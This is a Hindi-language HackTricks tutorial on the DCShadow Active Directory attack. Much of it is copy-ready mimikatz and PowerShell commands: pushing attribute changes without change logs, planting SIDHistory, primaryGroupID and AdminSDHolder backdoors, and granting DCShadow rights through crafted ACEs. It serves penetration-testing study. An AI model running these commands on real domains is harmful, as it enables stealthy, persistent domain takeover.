{{#include ../../banners/hacktricks-training.md}}

# DCShadow

यह AD में एक **नया डोमेन कंट्रोलर** पंजीकृत करता है और निर्दिष्ट वस्तुओं पर **गुण** (SIDHistory, SPNs...) को **धकेलने** के लिए इसका उपयोग करता है **बिना** किसी **लॉग** के जो **संशोधनों** के बारे में हो। आपको **DA** विशेषाधिकार की आवश्यकता है और **रूट डोमेन** के अंदर होना चाहिए।\
ध्यान दें कि यदि आप गलत डेटा का उपयोग करते हैं, तो काफी खराब लॉग दिखाई देंगे।

हमला करने के लिए आपको 2 mimikatz उदाहरणों की आवश्यकता है। इनमें से एक RPC सर्वरों को SYSTEM विशेषाधिकार के साथ शुरू करेगा (आपको यहां उन परिवर्तनों को इंगित करना होगा जिन्हें आप करना चाहते हैं), और दूसरा उदाहरण मानों को धकेलने के लिए उपयोग किया जाएगा:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
ध्यान दें कि **`elevate::token`** `mimikatz1` सत्र में काम नहीं करेगा क्योंकि यह थ्रेड के विशेषाधिकारों को बढ़ाता है, लेकिन हमें **प्रक्रिया के विशेषाधिकार** को बढ़ाने की आवश्यकता है।\
आप "LDAP" ऑब्जेक्ट भी चुन सकते हैं: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

आप एक DA से या इस न्यूनतम अनुमतियों वाले उपयोगकर्ता से परिवर्तन कर सकते हैं:

- **डोमेन ऑब्जेक्ट** में:
- _DS-Install-Replica_ (डोमेन में प्रतिकृति जोड़ें/हटाएं)
- _DS-Replication-Manage-Topology_ (प्रतिलिपि टोपोलॉजी प्रबंधित करें)
- _DS-Replication-Synchronize_ (प्रतिलिपि समन्वयन)
- **कॉन्फ़िगरेशन कंटेनर** में **साइट्स ऑब्जेक्ट** (और इसके बच्चे):
- _CreateChild and DeleteChild_
- **कंप्यूटर का ऑब्जेक्ट जो DC के रूप में पंजीकृत है**:
- _WriteProperty_ (Not Write)
- **लक्ष्य ऑब्जेक्ट**:
- _WriteProperty_ (Not Write)

आप [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) का उपयोग करके इन विशेषाधिकारों को एक अप्रिविलेज्ड उपयोगकर्ता को दे सकते हैं (ध्यान दें कि इससे कुछ लॉग रह जाएंगे)। यह DA विशेषाधिकारों की तुलना में बहुत अधिक प्रतिबंधात्मक है।\
उदाहरण के लिए: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` इसका मतलब है कि उपयोगकर्ता नाम _**student1**_ जब मशीन _**mcorp-student1**_ में लॉग इन होता है, तो उसके पास ऑब्जेक्ट _**root1user**_ पर DCShadow अनुमतियाँ हैं।

## बैकडोर बनाने के लिए DCShadow का उपयोग करना
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - DCShadow का उपयोग करके DCShadow अनुमतियाँ दें (संशोधित अनुमतियों के लॉग नहीं)

हमें अपने उपयोगकर्ता के SID के साथ निम्नलिखित ACEs को अंत में जोड़ने की आवश्यकता है:

- डोमेन ऑब्जेक्ट पर:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- हमलावर कंप्यूटर ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
- लक्षित उपयोगकर्ता ऑब्जेक्ट पर: `(A;;WP;;;UserSID)`
- कॉन्फ़िगरेशन कंटेनर में साइट्स ऑब्जेक्ट पर: `(A;CI;CCDC;;;UserSID)`

किसी ऑब्जेक्ट का वर्तमान ACE प्राप्त करने के लिए: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

ध्यान दें कि इस मामले में आपको **कई परिवर्तन** करने की आवश्यकता है, केवल एक नहीं। इसलिए, **mimikatz1 सत्र** (RPC सर्वर) में उस प्रत्येक परिवर्तन के साथ **`/stack`** पैरामीटर का उपयोग करें जिसे आप करना चाहते हैं। इस तरह, आपको सभी अटके हुए परिवर्तनों को करने के लिए केवल एक बार **`/push`** करने की आवश्यकता होगी।

[**DCShadow के बारे में अधिक जानकारी ired.team पर।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
